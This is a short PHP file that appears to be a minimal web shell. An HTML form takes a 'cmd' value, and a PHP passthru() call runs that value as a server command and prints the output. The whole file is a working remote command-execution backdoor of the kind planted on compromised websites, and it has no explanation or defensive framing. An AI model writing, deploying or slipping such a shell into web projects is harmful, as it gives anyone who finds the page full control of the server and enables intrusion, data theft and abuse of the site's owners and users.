
<form action="" method="get">
<input type="text" name="cmd" /><input type="submit" value="Exec" />
</form>
<pre><?php passthru($_REQUEST['cmd'], $result); ?></pre>